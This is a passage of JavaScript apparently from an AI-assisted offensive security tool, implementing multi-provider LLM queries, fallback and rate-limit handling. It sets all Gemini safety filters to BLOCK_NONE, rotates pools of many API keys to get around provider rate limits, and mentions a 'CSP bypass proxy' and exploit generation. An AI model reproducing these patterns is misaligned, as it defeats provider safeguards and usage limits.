        for (const [provider, key] of Object.entries(this.backupKeys)) {
            const status = key ? '✅ Ready' : '❌ Not set';
            log(`      ${provider}: ${status}`, key ? 'green' : 'yellow');
        }
    },

    // Check if provider is rate limited
    isProviderRateLimited(provider) {
        // Check free providers
        if (this.freeProviders[provider]) {
            return Date.now() < (this.freeProviders[provider].rateLimitReset || 0);
        }
        return Date.now() < (this.providerRateLimits[provider] || 0);
    },

    // Get next available backup (including free providers)
    getNextBackup() {
        // First try free providers
        for (const [name, config] of Object.entries(this.freeProviders)) {
            if (config.enabled &&
                !this.isProviderRateLimited(name) &&
                config.failures < 5) {
                return name;
            }
        }

        // Then try API key providers
        for (const provider of this.fallbackOrder) {
            if (this.backupKeys[provider] &&
                !this.isProviderRateLimited(provider) &&
                (this.providerFailures[provider] || 0) < 3) {
                return provider;
            }
        }
        return null;
    },

    // Cache helpers
    getCacheKey(prompt) {
        return prompt.substring(0, 100).replace(/\\s+/g, '_');
    },

    getFromCache(prompt) {
        const key = this.getCacheKey(prompt);
        const cached = this.responseCache.get(key);
        if (cached && (Date.now() - cached.time) < this.cacheMaxAge) {
            log('📦 Using cached response', 'green');
            return cached.response;
        }
        return null;
    },

    saveToCache(prompt, response) {
        const key = this.getCacheKey(prompt);
        this.responseCache.set(key, { response, time: Date.now() });
        if (this.responseCache.size > 100) {
            const firstKey = this.responseCache.keys().next().value;
            this.responseCache.delete(firstKey);
        }
    },

    // Auto-detect provider from API key prefix
    detectProvider(key) {
        if (!key) return 'gemini';
        if (key.startsWith('sk-ant-')) return 'anthropic';
        if (key.startsWith('sk-or-')) return 'openrouter';
        if (key.startsWith('gsk_')) return 'groq';
        if (key.startsWith('sk-') && key.length > 45 && !key.includes('deepseek')) return 'openai';
        if (key.includes('deepseek') || (key.startsWith('sk-') && key.length < 45)) return 'deepseek';
        if (key.startsWith('AIza')) return 'gemini';
        // Together API keys are usually long alphanumeric
        if (key.length > 60 && /^[a-f0-9]+$/.test(key)) return 'together';
        return 'gemini';
    },

    // Initialize AI (auto-detects provider)
    init(apiKey, forceProvider = null) {
        const detectedProvider = forceProvider || this.detectProvider(apiKey);
        this.config.apiKey = apiKey;
        this.config.provider = detectedProvider;
        this.config.isActive = true;
        this.config.rateLimitUntil = 0;

        log(`🔍 Detected provider: ${detectedProvider.toUpperCase()} (from key prefix)`, 'cyan');

        logBox('🤖 NEXUS AI ENGINE v5.0', [
            `Provider: ${detectedProvider.toUpperCase()} (auto-detected)`,
            `Collaboration Mode: ${this.config.collaborationMode ? 'ENABLED' : 'DISABLED'}`,
            `Deep Analysis: ${this.config.deepAnalysis ? 'ENABLED' : 'DISABLED'}`,
            `Status: ONLINE & READY`,
            '',
            'Capabilities:',
            '  • Multi-provider fallback (8 providers)',
            '  • Bidirectional AI collaboration',
            '  • Auto vulnerability analysis',
            '  • Real-time exploit generation',
            '  • Browser ↔ Terminal AI sync'
        ], 'magenta');

        return true;
    },

    // Safe string conversion
    safeString(value, maxLen = 200) {
        if (value === null || value === undefined) return '';
        if (typeof value === 'string') return value.substring(0, maxLen);
        if (typeof value === 'object') {
            try {
                return JSON.stringify(value).substring(0, maxLen);
            } catch (e) {
                return '[Object]';
            }
        }
        return String(value).substring(0, maxLen);
    },

    // Rate limit check
    isRateLimited() {
        return Date.now() < this.config.rateLimitUntil;
    },

    // Wait for rate limit
    async waitForRateLimit() {
        if (this.isRateLimited()) {
            const waitTime = this.config.rateLimitUntil - Date.now();
            log(`⏳ Rate limited. Waiting ${Math.ceil(waitTime / 1000)}s...`, 'yellow');
            await this.delay(waitTime + 1000);
        }
    },

    // Delay helper
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    },

    // === GENERIC HTTP REQUEST HELPER ===
    _makeHTTPRequest(options, body = null) {
        return new Promise((resolve, reject) => {
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    try {
                        // Update ProRateLimiter with response headers
                        if (options.hostname) {
                            const provider = this._getProviderFromHostname(options.hostname);
                            ProRateLimiter.updateFromHeaders(provider, res.headers);
                        }

                        // Handle rate limiting
                        if (res.statusCode === 429) {
                            const retryAfter = res.headers['retry-after'];
                            const retryMs = retryAfter ? parseInt(retryAfter) * 1000 : 60000;
                            resolve({ error: 'Rate limited', rateLimited: true, retryAfter: retryMs });
                            return;
                        }

                        // Handle other errors
                        if (res.statusCode >= 400) {
                            resolve({ error: `HTTP ${res.statusCode}`, statusCode: res.statusCode });
                            return;
                        }

                        // Parse JSON response
                        const json = JSON.parse(data);
                        resolve(json);
                    } catch (e) {
                        resolve(data); // Return raw data if not JSON
                    }
                });
            });

            req.setTimeout(options.timeout || 30000, () => {
                req.destroy();
                reject(new Error('Request timeout'));
            });

            req.on('error', (e) => reject(e));

            if (body) req.write(body);
            req.end();
        });
    },

    // Helper to get provider from hostname
    _getProviderFromHostname(hostname) {
        if (hostname.includes('groq')) return 'groq';
        if (hostname.includes('gemini') || hostname.includes('googleapis')) return 'gemini';
        if (hostname.includes('openai')) return 'openai';
        if (hostname.includes('deepseek')) return 'deepseek';
        if (hostname.includes('together')) return 'together';
        if (hostname.includes('mistral')) return 'mistral';
        if (hostname.includes('huggingface')) return 'huggingface';
        return 'groq';
    },

    // === SMART REQUEST THROTTLING (Uses ProRateLimiter) ===
    async throttleRequest() {
        // Use ProRateLimiter for smart throttling
        const provider = this.config.provider || 'groq';
        await ProRateLimiter.smartWait(provider);

        this.lastRequestTimestamp = Date.now();
    },

    // Old throttle method (kept for compatibility but now uses ProRateLimiter)
    async _legacyThrottle() {
        const now = Date.now();
        const timeSinceLastRequest = now - this.lastRequestTimestamp;

        // Use exponential backoff if we've been rate limited recently
        if (this.backoffState.consecutiveRateLimits > 0) {
            const extraDelay = Math.min(
                this.backoffState.currentDelay,
                this.backoffState.maxDelay
            );
            const waitTime = Math.max(extraDelay, this.config.minRequestInterval - timeSinceLastRequest);
            if (waitTime > 0) {
                log(`⏳ Smart throttle: ${Math.ceil(waitTime / 1000)}s delay...`, 'gray');
                await this.delay(waitTime);
            }
        } else if (timeSinceLastRequest < this.config.minRequestInterval) {
            const waitTime = this.config.minRequestInterval - timeSinceLastRequest;
            await this.delay(waitTime);
        }

        this.lastRequestTimestamp = Date.now();
    },

    // === SMART AUTO SWITCH TO BACKUP (Uses ProRateLimiter) ===
    async switchToBackup(reason = 'rate_limit') {
        log(`🔄 Switching provider due to: ${reason}`, 'yellow');

        // Notify ProRateLimiter about the rate limit
        const currentProvider = this.config.provider?.toLowerCase() || 'groq';
        ProRateLimiter.onRateLimit(currentProvider);

        // Mark current provider as limited
        const cooldown = Math.min(60000 * (this.backoffState.consecutiveRateLimits + 1), 300000); // Max 5 min
        this.providerRateLimits[this.config.provider] = Date.now() + cooldown;

        // Increase backoff
        this.increaseBackoff();

        // === FIRST TRY KEY POOL ROTATION ===
        if (currentProvider && this.keyPool[currentProvider]?.length > 1) {
            const nextKey = this.markKeyRateLimited(currentProvider, cooldown);
            if (nextKey) {
                log(`🔑 Rotated to next ${currentProvider.toUpperCase()} key from pool`, 'cyan');
                this.config.apiKey = nextKey;
                this.backupKeys[currentProvider] = nextKey;
                // Reset ProRateLimiter penalty for new key
                ProRateLimiter.adaptive.currentPenalty[currentProvider] = 1;
                return true;
            }
        }

        // === TRY OTHER PROVIDERS' KEY POOLS ===
        for (const provider of this.fallbackOrder) {
            if (provider === currentProvider || provider === 'huggingface') continue;

            if (this.keyPool[provider]?.length > 0) {
                const key = this.getNextKey(provider);
                if (key) {
                    log(`🔑 Switched to ${provider.toUpperCase()} key from pool`, 'green');
                    this.config.provider = provider;
                    this.config.apiKey = key;
                    this.backupKeys[provider] = key;
                    this.resetBackoff();
                    return true;
                }
            }
        }

        // === THEN TRY FREE PROVIDERS (NO API KEY NEEDED) ===
        const hfResult = await this.queryHuggingFace(this.lastPrompt || 'test');
        if (hfResult) {
            log('✅ Switched to FREE HuggingFace provider', 'green');
            return true;
        }

        // === THEN TRY SINGLE API KEY PROVIDERS ===
        for (const provider of this.fallbackOrder) {
            // Skip huggingface as we already tried it
            if (provider === 'huggingface') continue;

            if (this.backupKeys[provider] && !this.isProviderRateLimited(provider)) {
                log(`✅ Switched to ${provider.toUpperCase()}`, 'green');
                this.config.provider = provider;
                this.config.apiKey = this.backupKeys[provider];
                this.resetBackoff(); // Reset backoff on successful switch
                return true;
            }
        }

        // === APPLY EXPONENTIAL BACKOFF AND RETRY CURRENT ===
        if (this.backoffState.consecutiveRateLimits < 5) {
            await this.applyBackoff(reason);
            log('⏳ Will retry with current provider after backoff...', 'yellow');
            return 'retry';  // Signal to retry with current provider
        }

        log('❌ No backup providers available. Tips:', 'red');
        log('   1. addkey groq YOUR_FREE_GROQ_KEY (add multiple!)', 'yellow');
        log('   2. bulkkeys groq (paste many keys at once)', 'yellow');
        log('   3. Get free keys at: console.groq.com', 'yellow');
        log('   4. keypool - see all your keys status', 'yellow');
        return false;
    },

    // Query AI with full error handling
    async query(prompt, context = {}, retryCount = 0) {
        if (!this.config.apiKey) {
            return { error: 'AI not configured. Use: ai-key YOUR_KEY' };
        }

        // === SIMPLE DIRECT QUERY - NO RATE LIMITING ===
        // Use the configured provider directly
        const provider = this.config.provider?.toLowerCase() || 'groq';

        // Build enriched prompt
        let fullPrompt = prompt;

        // Add system prompt
        const systemPrompt = context.systemPrompt || AI_SYSTEM_PROMPTS.security_analyst;

        // Prepend system prompt
        fullPrompt = `SYSTEM: ${systemPrompt}\n\n${fullPrompt}`;

        // Store last prompt
        this.lastPrompt = prompt;

        try {
            let response;

            // Direct provider call - NO complex logic
            switch (provider) {
                case 'gemini':
                    response = await this.queryGemini(fullPrompt);
                    break;
                case 'openai':
                    response = await this.queryOpenAI(fullPrompt);
                    break;
                case 'deepseek':
                    response = await this.queryDeepSeek(fullPrompt);
                    break;
                case 'anthropic':
                    response = await this.queryAnthropic(fullPrompt);
                    break;
                case 'groq':
                    response = await this.queryGroq(fullPrompt);
                    break;
                case 'together':
                    response = await this.queryTogether(fullPrompt);
                    break;
                case 'mistral':
                    response = await this.queryMistral(fullPrompt);
                    break;
                case 'openrouter':
                    response = await this.queryOpenRouter(fullPrompt);
                    break;
                default:
                    response = await this.queryGroq(fullPrompt);
            }

            // Check if response is valid
            if (response && !response.error) {
                // Save to history
                this.conversationHistory.push({ role: 'user', content: this.safeString(prompt, 500) });
                this.conversationHistory.push({ role: 'assistant', content: this.safeString(response, 1000) });

                // Keep history manageable
                if (this.conversationHistory.length > 20) {
                    this.conversationHistory = this.conversationHistory.slice(-20);
                }

                return response;
            }

            // === FALLBACK TO OTHER PROVIDERS ON RATE LIMIT ===
            if (response && response.rateLimited) {
                const fallbackProviders = ['deepseek', 'together', 'mistral', 'openrouter'];
                const currentProvider = this.config.provider || 'groq';

                // Try each fallback provider
                for (const fallback of fallbackProviders) {
                    if (fallback === currentProvider) continue;

                    log(`🔄 ${currentProvider.toUpperCase()} rate limited, trying ${fallback.toUpperCase()}...`, 'yellow');

                    try {
                        let fallbackResponse;
                        switch (fallback) {
                            case 'deepseek':
                                fallbackResponse = await this.queryDeepSeek(fullPrompt);
                                break;
                            case 'together':
                                fallbackResponse = await this.queryTogether(fullPrompt);
                                break;
                            case 'mistral':
                                fallbackResponse = await this.queryMistral(fullPrompt);
                                break;
                            case 'openrouter':
                                fallbackResponse = await this.queryOpenRouter(fullPrompt);
                                break;
                        }

                        if (fallbackResponse && !fallbackResponse.error) {
                            log(`✅ Got response from ${fallback.toUpperCase()} fallback`, 'green');
                            return fallbackResponse;
                        }
                    } catch (fallbackErr) {
                        log(`⚠️ ${fallback} fallback failed: ${fallbackErr.message}`, 'dim');
                    }
                }

                // === ULTIMATE FALLBACK: GUARANTEED AI SYSTEM ===
                log('🆘 Using GuaranteedAI system (all providers failed)...', 'yellow');
                try {
                    const guaranteedResponse = await GuaranteedAI.query(fullPrompt, this);
                    if (guaranteedResponse && typeof guaranteedResponse === 'string') {
                        return guaranteedResponse;
                    }
                } catch (gErr) {
                    log(`GuaranteedAI error: ${gErr.message}`, 'dim');
                }

                return { error: 'All providers exhausted. Try adding more API keys with: addkey provider YOUR_KEY', rateLimited: true };
            }

            // Handle other errors with simple retry
            if (retryCount < 2) {
                await this.delay(1000);
                return this.query(prompt, context, retryCount + 1);
            }

            // === FINAL FALLBACK: GUARANTEED AI ===
            log('🆘 Last resort: GuaranteedAI...', 'yellow');
            try {
                const lastResort = await GuaranteedAI.query(fullPrompt, this);
                if (lastResort && typeof lastResort === 'string') {
                    return lastResort;
                }
            } catch (e2) {
                log(`GuaranteedAI error: ${e2.message}`, 'dim');
            }

            return response || { error: 'No response from AI' };

        } catch (e) {
            log(`AI Error: ${e.message}`, 'red');

            // Simple retry
            if (retryCount < 2) {
                await this.delay(1000);
                return this.query(prompt, context, retryCount + 1);
            }

            // === CATCH-ALL FALLBACK ===
            try {
                const emergency = await GuaranteedAI.query(prompt, this);
                if (emergency && typeof emergency === 'string') {
                    return emergency;
                }
            } catch (e3) {
                // Silent fail
            }

            return { error: e.message };
        }
    },

    // Gemini API with smart model fallback and rate limit handling
    async queryGemini(prompt) {
        // CORRECT WORKING MODELS in v1beta API (February 2026)
        // Use gemini-1.5 models which are stable and available
        const models = [
            'gemini-1.5-flash',           // FASTEST - recommended
            'gemini-1.5-flash-8b',        // LIGHTWEIGHT backup
            'gemini-1.5-pro',             // MOST CAPABLE - use if others fail
            'gemini-1.0-pro'              // LEGACY fallback
        ];

        // If we have a working model, try it first
        if (this.config.currentModel && this.modelStats[this.config.currentModel] > 0) {
            const idx = models.indexOf(this.config.currentModel);
            if (idx > 0) {
                models.splice(idx, 1);
                models.unshift(this.config.currentModel);
            }
        }

        let lastError = null;

        for (const model of models) {
            try {
                const result = await this._tryGeminiModel(prompt, model);
                if (result && !result.error && !result.rateLimited) {
                    // Track successful model
                    this.config.currentModel = model;
                    this.modelStats[model] = (this.modelStats[model] || 0) + 1;
                    log(`✅ AI response from: ${model}`, 'green');
                    return result;
                }

                if (result && result.rateLimited) {
                    log(`⚠️ Model ${model} rate limited, trying next...`, 'yellow');
                    lastError = 'Rate limited';
                    continue;
                }
            } catch (e) {
                lastError = e.message;
                log(`⚠️ Model ${model} failed: ${e.message}`, 'yellow');
                continue;
            }
        }

        // All Gemini models failed - try ALL backup providers
        log('⚠️ All Gemini models failed. Trying backup providers...', 'yellow');
        const backupResult = await this.tryAllBackups(prompt);
        if (backupResult) return backupResult;

        return { error: lastError || 'All providers failed. Set backup: setBackup groq YOUR_KEY' };
    },

    // === UNIVERSAL BACKUP QUERY ===
    async queryBackupProvider(prompt, provider) {
        const key = this.backupKeys[provider];
        if (!key) return null;

        const configs = {
            groq: { hostname: 'api.groq.com', path: '/openai/v1/chat/completions', model: 'llama-3.3-70b-versatile' },
            openai: { hostname: 'api.openai.com', path: '/v1/chat/completions', model: 'gpt-4o-mini' },
            deepseek: { hostname: 'api.deepseek.com', path: '/v1/chat/completions', model: 'deepseek-chat' },
            together: { hostname: 'api.together.xyz', path: '/v1/chat/completions', model: 'meta-llama/Llama-3.3-70B-Instruct-Turbo' },
            mistral: { hostname: 'api.mistral.ai', path: '/v1/chat/completions', model: 'mistral-small-latest' },
            openrouter: { hostname: 'openrouter.ai', path: '/api/v1/chat/completions', model: 'google/gemini-flash-1.5' }
        };

        const config = configs[provider];
        if (!config) return null;

        return new Promise((resolve) => {
            const data = JSON.stringify({
                model: config.model,
                messages: [
                    { role: 'system', content: 'You are an expert security researcher and bug bounty hunter.' },
                    { role: 'user', content: prompt }
                ],
                max_tokens: 4096,
                temperature: 0.7
            });

            const options = {
                hostname: config.hostname,
                path: config.path,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${key}`
                },
                timeout: 30000
            };

            const req = https.request(options, (res) => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => {
                    try {
                        if (res.statusCode === 429) {
                            this.providerRateLimits[provider] = Date.now() + 60000;
                            this.providerFailures[provider] = (this.providerFailures[provider] || 0) + 1;
                            resolve(null);
                            return;
                        }
                        const json = JSON.parse(body);
                        if (json.choices?.[0]?.message?.content) {
                            this.providerFailures[provider] = 0;
                            log(`✅ Response from backup: ${provider}`, 'green');
                            resolve(json.choices[0].message.content);
                        } else {
                            this.providerFailures[provider] = (this.providerFailures[provider] || 0) + 1;
                            resolve(null);
                        }
                    } catch (e) {
                        resolve(null);
                    }
                });
            });

            req.setTimeout(30000, () => { req.destroy(); resolve(null); });
            req.on('error', () => resolve(null));
            req.write(data);
            req.end();
        });
    },

    // Try all backup providers (including FREE ones!)
    async tryAllBackups(prompt) {
        // === TRY FREE PROVIDERS FIRST ===
        log('🆓 Trying FREE HuggingFace provider...', 'cyan');
        const hfResult = await this.queryHuggingFace(prompt);
        if (hfResult) {
            log('✅ Success with FREE HuggingFace!', 'green');
            return hfResult;
        }

        // === THEN TRY API KEY PROVIDERS ===
        for (const provider of this.fallbackOrder) {
            if (provider === 'huggingface') continue; // Already tried

            if (this.backupKeys[provider] && !this.isProviderRateLimited(provider)) {
                log(`🔄 Trying backup: ${provider}...`, 'yellow');
                const result = await this.queryBackupProvider(prompt, provider);
                if (result) return result;
            }
        }
        return null;
    },

    // Try specific Gemini model with better error handling
    _tryGeminiModel(prompt, model) {
        return new Promise((resolve, reject) => {
            const data = JSON.stringify({
                contents: [{ parts: [{ text: prompt }] }],
                generationConfig: {
                    temperature: 0.7,
                    maxOutputTokens: 8192
                },
                safetySettings: [
                    { category: 'HARM_CATEGORY_HARASSMENT', threshold: 'BLOCK_NONE' },
                    { category: 'HARM_CATEGORY_HATE_SPEECH', threshold: 'BLOCK_NONE' },
                    { category: 'HARM_CATEGORY_SEXUALLY_EXPLICIT', threshold: 'BLOCK_NONE' },
                    { category: 'HARM_CATEGORY_DANGEROUS_CONTENT', threshold: 'BLOCK_NONE' }
                ]
            });

            const options = {
                hostname: 'generativelanguage.googleapis.com',
                path: `/v1beta/models/${model}:generateContent?key=${this.config.apiKey}`,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(data)
                },
                timeout: 30000
            };

            const req = https.request(options, (res) => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => {
                    try {
                        const json = JSON.parse(body);

                        // Rate limited
                        if (res.statusCode === 429) {
                            // Extract wait time from error message
                            const match = (json.error?.message || '').match(/(\d+\.?\d*)s/);
                            const waitTime = match ? parseFloat(match[1]) * 1000 : 60000;
                            this.config.rateLimitUntil = Date.now() + waitTime;
                            resolve({ rateLimited: true, waitTime });
                            return;
                        }

                        // Model not found
                        if (res.statusCode === 404) {
                            reject(new Error(`Model ${model} not found`));
                            return;
                        }

                        // Success
                        if (json.candidates && json.candidates[0]?.content?.parts?.[0]?.text) {
                            resolve(json.candidates[0].content.parts[0].text);
                        } else if (json.error) {
                            reject(new Error(json.error.message || 'Unknown error'));
                        } else if (json.promptFeedback?.blockReason) {
                            resolve('Content blocked by safety filters. Try rephrasing.');
                        } else {
                            resolve(body);
                        }
                    } catch (e) {
                        resolve(body);
                    }
                });
            });

            req.setTimeout(30000, () => {
                req.destroy();
                reject(new Error('Request timeout'));
            });

            req.on('error', reject);
            req.write(data);
            req.end();
        });
    },

    // OpenAI API
    async queryOpenAI(prompt) {
        return new Promise((resolve, reject) => {
            const data = JSON.stringify({
                model: 'gpt-4o-mini',
                messages: [
                    { role: 'system', content: 'You are an elite bug bounty hunter and security researcher.' },
                    { role: 'user', content: prompt }
                ],
                max_tokens: 4096
            });

            const options = {
                hostname: 'api.openai.com',
                path: '/v1/chat/completions',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${this.config.apiKey}`
                }
            };

            const req = https.request(options, (res) => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => {
                    try {
                        const json = JSON.parse(body);
                        if (json.choices && json.choices[0]) {
                            resolve(json.choices[0].message.content);
                        } else {
                            reject(new Error(json.error?.message || 'Unknown error'));
                        }
                    } catch (e) {
                        resolve(body);
                    }
                });
            });

            req.on('error', reject);
            req.write(data);
            req.end();
        });
    },

    // Groq API (ultra fast, FREE - best backup)
    async queryGroq(prompt, retryCount = 0) {
        // Groq models in order of rate limit tolerance
        const models = [
            'llama-3.1-8b-instant',      // Highest rate limit (30 RPM free)
            'llama-3.3-70b-versatile',   // Best quality
            'mixtral-8x7b-32768',        // Good alternative
            'gemma2-9b-it'               // Fallback
        ];

        const modelIndex = Math.min(retryCount, models.length - 1);
        const model = models[modelIndex];

        const result = await this._queryOpenAICompatible(prompt, {
            hostname: 'api.groq.com',
            path: '/openai/v1/chat/completions',
            model: model
        });

        // If rate limited, try next model
        if (result && result.rateLimited && retryCount < models.length - 1) {
            log(`⏳ Trying next Groq model: ${models[retryCount + 1]}...`, 'yellow');
            await this.delay(1500); // Wait 1.5s before retry
            return this.queryGroq(prompt, retryCount + 1);
        }

        return result;
    },

    // Together AI (good alternative)
    async queryTogether(prompt) {
        return this._queryOpenAICompatible(prompt, {
            hostname: 'api.together.xyz',
            path: '/v1/chat/completions',
            model: 'meta-llama/Llama-3.3-70B-Instruct-Turbo'
        });
    },

    // Mistral AI
    async queryMistral(prompt) {
        return this._queryOpenAICompatible(prompt, {
            hostname: 'api.mistral.ai',
            path: '/v1/chat/completions',
            model: 'mistral-small-latest'
        });
    },

    // OpenRouter (multi-model gateway)
    async queryOpenRouter(prompt) {
        return this._queryOpenAICompatible(prompt, {
            hostname: 'openrouter.ai',
            path: '/api/v1/chat/completions',
            model: 'google/gemini-flash-1.5'
        });
    },

    // Generic OpenAI-compatible API handler
    _queryOpenAICompatible(prompt, opts) {
        return new Promise((resolve, reject) => {
            const data = JSON.stringify({
                model: opts.model,
                messages: [
                    { role: 'system', content: 'You are an expert security researcher and bug bounty hunter.' },
                    { role: 'user', content: prompt }
                ],
                max_tokens: 4096,
                temperature: 0.7
            });

            const options = {
                hostname: opts.hostname,
                path: opts.path,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${this.config.apiKey}`
                },
                timeout: 30000
            };

            // Debug: Log API call
            log(`🔄 Calling ${opts.hostname} (${opts.model})...`, 'dim');

            const req = https.request(options, (res) => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => {
                    try {
                        const json = JSON.parse(body);

                        // Handle rate limit
                        if (res.statusCode === 429) {
                            log(`⏳ Rate limited by ${opts.hostname}`, 'yellow');
                            resolve({ error: 'Rate limited', rateLimited: true });
                            return;
                        }

                        // Handle auth errors - SWITCH PROVIDER IMMEDIATELY
                        if (res.statusCode === 401 || res.statusCode === 403) {
                            log(`❌ Auth error (${res.statusCode}): Check your API key`, 'red');
                            resolve({ error: json.error?.message || 'Invalid API Key', authError: true });
                            return;
                        }

                        // Handle server errors
                        if (res.statusCode >= 500) {
                            log(`❌ Server error (${res.statusCode}) from ${opts.hostname}`, 'red');
                            resolve({ error: `Server error: ${res.statusCode}` });
                            return;
                        }

                        // Success
                        if (json.choices && json.choices[0]?.message?.content) {
                            log(`✅ Got response from ${opts.hostname}`, 'green');
                            resolve(json.choices[0].message.content);
                        } else if (json.error) {
                            log(`❌ API error: ${json.error.message || json.error}`, 'red');
                            resolve({ error: json.error.message || 'Unknown error' });
                        } else {
                            resolve(body);
                        }
                    } catch (e) {
                        log(`❌ Parse error: ${e.message}`, 'red');
                        resolve(body);
                    }
                });
            });

            req.setTimeout(30000, () => {
                req.destroy();
                reject(new Error('Request timeout'));
            });

            req.on('error', (e) => {
                log(`❌ Network error: ${e.message}`, 'red');
                reject(e);
            });
            req.write(data);
            req.end();
        });
    },

    // ═══════════════════════════════════════════════════════════════════════════
    // API KEY VALIDATION - Used for browser CSP bypass proxy validation
    // ═══════════════════════════════════════════════════════════════════════════

    async validateKeyDirect(apiKey, provider) {
        if (!apiKey) return false;

        provider = provider?.toLowerCase() || 'groq';

        const configs = {
            groq: {
                hostname: 'api.groq.com',
                path: '/openai/v1/chat/completions',
                model: 'llama-3.3-70b-versatile',
                authHeader: `Bearer ${apiKey}`
            },
            openai: {
                hostname: 'api.openai.com',
                path: '/v1/chat/completions',
                model: 'gpt-3.5-turbo',
                authHeader: `Bearer ${apiKey}`
            },
            deepseek: {
                hostname: 'api.deepseek.com',
                path: '/v1/chat/completions',
                model: 'deepseek-chat',
                authHeader: `Bearer ${apiKey}`
            },
            gemini: {
                hostname: 'generativelanguage.googleapis.com',
                path: `/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`,
                isGemini: true
            },
            anthropic: {
                hostname: 'api.anthropic.com',
                path: '/v1/messages',
                model: 'claude-3-haiku-20240307',
                authHeader: apiKey,
                isAnthropic: true
            },
            together: {
                hostname: 'api.together.xyz',
                path: '/v1/chat/completions',
                model: 'meta-llama/Llama-3.3-70B-Instruct-Turbo',
                authHeader: `Bearer ${apiKey}`
            },
            mistral: {
                hostname: 'api.mistral.ai',
                path: '/v1/chat/completions',
                model: 'mistral-small-latest',
                authHeader: `Bearer ${apiKey}`
            },
            openrouter: {
                hostname: 'openrouter.ai',
                path: '/api/v1/chat/completions',
                model: 'google/gemini-flash-1.5',
                authHeader: `Bearer ${apiKey}`
            }
        };

        const config = configs[provider];
        if (!config) {
            log(`❌ Unknown provider: ${provider}`, 'red');
            return false;
        }

        return new Promise((resolve) => {
            let data;
            let headers = { 'Content-Type': 'application/json' };

            if (config.isGemini) {
                data = JSON.stringify({
                    contents: [{ parts: [{ text: 'Say OK' }] }],
                    generationConfig: { maxOutputTokens: 10 }
                });
            } else if (config.isAnthropic) {
                data = JSON.stringify({
                    model: config.model,
                    max_tokens: 10,
                    messages: [{ role: 'user', content: 'Say OK' }]
                });
                headers['x-api-key'] = apiKey;
                headers['anthropic-version'] = '2023-06-01';
            } else {
                data = JSON.stringify({
                    model: config.model,
                    messages: [{ role: 'user', content: 'Say OK' }],
                    max_tokens: 10
                });
                headers['Authorization'] = config.authHeader;
            }

            const options = {
                hostname: config.hostname,
                path: config.path,
                method: 'POST',
                headers: headers,
                timeout: 15000
            };

            log(`🔑 Validating ${provider.toUpperCase()} key...`, 'cyan');

            const req = https.request(options, (res) => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => {
                    if (res.statusCode === 200 || res.statusCode === 201) {
                        log(`✅ ${provider.toUpperCase()} key is VALID`, 'green');
                        resolve(true);
                    } else if (res.statusCode === 429) {
                        // Rate limited but key is valid
                        log(`⏳ ${provider.toUpperCase()} rate limited but key appears valid`, 'yellow');
                        resolve(true);
                    } else if (res.statusCode === 401 || res.statusCode === 403) {
                        log(`❌ ${provider.toUpperCase()} key is INVALID (auth error)`, 'red');
                        resolve(false);
                    } else {
                        log(`⚠️ ${provider.toUpperCase()} validation uncertain (${res.statusCode})`, 'yellow');
                        resolve(false);
                    }
                });
            });

            req.setTimeout(15000, () => {
                req.destroy();
                log(`⏱️ ${provider.toUpperCase()} validation timeout`, 'yellow');
                resolve(false);
            });

            req.on('error', (e) => {
                log(`❌ ${provider.toUpperCase()} validation error: ${e.message}`, 'red');
                resolve(false);
            });

            req.write(data);
            req.end();
        });
    },

    // Query with specific key (for CSP bypass proxy)
    async queryWithKey(prompt, provider, apiKey) {
        const originalKey = this.config.apiKey;
        const originalProvider = this.config.provider;

        try {
            // Temporarily switch to provided key/provider
            this.config.apiKey = apiKey;
            this.config.provider = provider;

            // Call the appropriate query method
            let response;
            switch (provider?.toLowerCase()) {
                case 'gemini':
                    response = await this.queryGemini(prompt);
                    break;
                case 'openai':
                    response = await this.queryOpenAI(prompt);
                    break;
                case 'deepseek':
                    response = await this.queryDeepSeek(prompt);
                    break;
                case 'anthropic':
                    response = await this.queryAnthropic(prompt);
                    break;
                case 'groq':
                    response = await this.queryGroq(prompt);
                    break;
                case 'together':
                    response = await this.queryTogether(prompt);
                    break;
                case 'mistral':
                    response = await this.queryMistral(prompt);
                    break;
                case 'openrouter':
                    response = await this.queryOpenRouter(prompt);
                    break;
                default:
                    response = await this.queryGroq(prompt);
            }

            return response;
        } finally {
            // Restore original key/provider
            this.config.apiKey = originalKey;
            this.config.provider = originalProvider;
        }
    },

    // DeepSeek API
    async queryDeepSeek(prompt) {
        return new Promise((resolve, reject) => {
            const data = JSON.stringify({
                model: 'deepseek-chat',
                messages: [
                    { role: 'system', content: 'You are an expert security researcher and bug bounty hunter.' },
                    { role: 'user', content: prompt }
                ],
                max_tokens: 4096
            });

            const options = {
                hostname: 'api.deepseek.com',
                path: '/v1/chat/completions',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${this.config.apiKey}`
                },
                timeout: 30000
            };

            const req = https.request(options, (res) => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => {
                    try {
                        const json = JSON.parse(body);
                        if (res.statusCode === 429) {
                            resolve({ error: 'Rate limited', rateLimited: true });
                            return;
                        }
                        if (json.choices && json.choices[0]?.message?.content) {
                            resolve(json.choices[0].message.content);
                        } else if (json.error) {
                            resolve({ error: json.error.message || 'Unknown error' });
                        } else {
                            resolve(body);
                        }
                    } catch (e) {
                        resolve(body);
                    }
                });
            });

            req.setTimeout(30000, () => {
                req.destroy();
                reject(new Error('Request timeout'));
            });

            req.on('error', reject);
            req.write(data);
            req.end();
        });
    },

    // Anthropic API
    async queryAnthropic(prompt) {
        return new Promise((resolve, reject) => {
            const data = JSON.stringify({
                model: 'claude-3-haiku-20240307',
                max_tokens: 4096,
                messages: [{ role: 'user', content: prompt }]
            });

            const options = {
                hostname: 'api.anthropic.com',
                path: '/v1/messages',
                method: 'POST',
                headers: {
